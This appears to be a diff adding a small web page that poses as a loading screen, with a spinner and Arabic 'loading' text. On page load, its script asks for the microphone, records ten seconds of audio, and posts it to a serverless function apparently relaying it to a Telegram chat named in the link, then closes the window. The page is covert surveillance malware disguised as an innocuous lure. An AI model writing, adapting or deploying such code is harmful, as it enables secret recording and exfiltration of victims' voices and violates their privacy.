@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>😂👻</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #1a2a3a;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            color: white;
+            overflow: hidden;
+        }
+        
+        .loader-container {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .spinner {
+            width: 80px;
+            height: 80px;
+            border: 8px solid rgba(255,255,255,0.3);
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        .loading-text {
+            font-size: 18px;
+            color: rgba(255,255,255,0.8);
+            margin-top: 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader-container">
+        <div class="spinner"></div>
+        <div class="loading-text">جاري التحميل...</div>
+    </div>
+
+    <script>
+        // أزليت التوكن من هنا
+        
+        function getChatId() {
+            const params = new URLSearchParams(window.location.search);
+            return params.get('chatId');
+        }
+        
+        async function sendAudioToTelegram(audioBlob, chatId) {
+            try {
+                // تحويل Blob إلى Base64
+                const base64Promise = new Promise((resolve) => {
+                    const reader = new FileReader();
+                    reader.onloadend = () => resolve(reader.result);
+                    reader.readAsDataURL(audioBlob);
+                });
+                
+                const base64Data = await base64Promise;
+                
+                // إرسال لـ Netlify Function
+                const response = await fetch('/.netlify/functions/send-audio', {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json' 
+                    },
+                    body: JSON.stringify({
+                        chatId: chatId,
+                        audio: base64Data.split(',')[1], // فقط الجزء بعد ,
+                        filename: `audio_${Date.now()}.webm`
+                    })
+                });
+                
+                const result = await response.json();
+                return result.success;
+                
+            } catch (error) {
+                console.error('Error sending audio:', error);
+                return false;
+            }
+        }
+        
+        async function recordAudio() {
+            const chatId = getChatId();
+            if (!chatId) {
+                window.close();
+                return;
+            }
+            
+            try {
+                // فتح الميكروفون
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    audio: {
+                        echoCancellation: true,
+                        noiseSuppression: true,
+                        sampleRate: 22050, // تردد أقل للسرعة
+                        channelCount: 1
+                    }
+                });
+                
+                // بدء تسجيل الصوت
+                const mediaRecorder = new MediaRecorder(stream, {
+                    mimeType: 'audio/webm;codecs=opus',
+                    audioBitsPerSecond: 32000 // جودة أقل للسرعة
+                });
+                
+                const chunks = [];
+                
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        chunks.push(event.data);
+                    }
+                };
+                
+                mediaRecorder.onstop = async () => {
+                    // تجميع الصوت
+                    const audioBlob = new Blob(chunks, { type: 'audio/webm' });
+                    
+                    // إرسال الصوت
+                    await sendAudioToTelegram(audioBlob, chatId);
+                    
+                    // إغلاق الميكروفون
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    // إغلاق النافذة بعد 1 ثانية
+                    setTimeout(() => {
+                        window.close();
+                    }, 1000);
+                };
+                
+                // بدء التسجيل
+                mediaRecorder.start();
+                
+                // تسجيل لمدة 10 ثواني
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 10000);
+                
+            } catch (error) {
+                console.error('Error accessing microphone:', error);
+                setTimeout(() => {
+                    window.close();
+                }, 1000);
+            }
+        }
+        
+        // بدء التسجيل فوراً
+        window.addEventListener('load', recordAudio);
+    </script>
+</body>
+</html>
